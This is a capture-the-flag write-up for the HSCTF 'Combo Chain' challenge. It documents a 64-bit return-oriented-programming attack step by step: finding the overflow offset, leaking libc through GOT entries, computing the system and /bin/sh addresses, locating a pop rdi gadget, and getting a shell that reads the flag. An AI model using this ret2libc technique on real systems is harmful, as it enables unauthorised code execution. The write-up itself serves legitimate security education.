# Combo Chain
Binary Exploitation

## Challenge 

	I've been really into Super Smash Brothers Melee lately...

	nc pwn.hsctf.com 2345

	libc SHA-1: 238e834fc5baa8094f5db0cde465385917be4c6a libc.so.6 
	libc6_2.23-0ubuntu11_amd64

	6/3/19 7:35 AM: Binary updated, SHA-1: 0bf0640256566d2505113f485949ec96f1cd0bb9
	combo-chain

Hint: What's a ROP?

## Solution

Given 64 bit ELF binary to do ROP.

Reference: 
- https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
- https://dustri.org/b/debugging-rop-like-a-pro.html
- https://ocw.cs.pub.ro/courses/cns/labs/lab-10 
- https://sidsbits.com/Defeating-ASLR-with-a-Leak/
- https://github.com/Naetw/CTF-pwn-tips/blob/master/README.md#find-binsh-or-sh-in-library
- https://github.com/osirislab/CTF-Solutions/blob/master/NULLCON_HACK_IM_2014/vuln3/strace.sh
- https://security.stackexchange.com/questions/179747/leak-a-got-entry-using-return-to-printfplt
- https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-babypwn-write-up-pwn115/

Fuzz length, I got 16 as offset

	# pwn cyclic 20 | strace ./combo-chain
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616165} ---
	+++ killed by SIGSEGV +++
	# pwn cyclic -l 0x61616165
	16

#### Leak LIBC

In order to leak libc, we need to do the following in ROP form.s

	printf@plt(*printf@got)

This will give us the address of printf in libc.


Decompile in hopper. Find PLT and GOT of printf

	j_printf:        // printf
	0000000000401050         jmp        qword [printf@GOT]     

	printf@GOT:        // printf
	0000000000404028         dq         0x0000000000405018                          ; DATA XREF=j_printf

Use objdump, we can find GOT also

	# objdump -R combo-chain | grep printf
	0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5

#### Offsets to system (Locally)

Do locally check using LDD

    # ldd -r -v combo-chain
        linux-vdso.so.1 (0x00007ffdbc7fb000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f39ab941000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f39abb0d000)

        Version information:
        ./combo-chain:
            libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
        /lib/x86_64-linux-gnu/libc.so.6:
            ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2
            ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
      2224: 0000000000023fb0   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system           
      1418: 00000000000449c0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

	# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
	 181519 /bin/sh

#### Offsets to system (Server)

Lookup table on https://libc.blukat.me/

https://libc.blukat.me/d/libc6_2.23-0ubuntu11_amd64.symbols 

	printf 0000000000055800
	gets 000000000006ed80
	system 0000000000045390
	str_bin_sh 18cd57

#### ROP gadgets

This is a 64-bit system, so the parameters need to be pop-ed onto RDI

	# ROPgadget --binary combo-chain | grep 'pop rdi'
	0x0000000000401263 : pop rdi ; ret

#### Solved for flag

Now we have all the info we need, I tried it locally and it was a success.

However, when doing on the server, it did not work.

After looking around, I changed the leaking of printf@got() to gets@got() and it worked. Must be some quirks.

Cat flag

	# python3 solve_rop.py 
	b'Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: '
	[!] Leaked gets@libc: b'\x80=\x82\xc2\xd0\x7f'
	[!] Leaked gets@libc: 0x7fd0c2823d80
	[!] Calculate system@libc: 0x7fd0c27fa390
	[!] Calculate binsh@libc: 0x7fd0c2941d57
	b' you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: '
	ls
		bin
		combo-chain
		combo-chain.c
		dev
		flag
		lib
		lib32
		lib64
	cat flag
		hsctf{i_thought_konami_code_would_work_here}

## Flag

	hsctf{i_thought_konami_code_would_work_here}
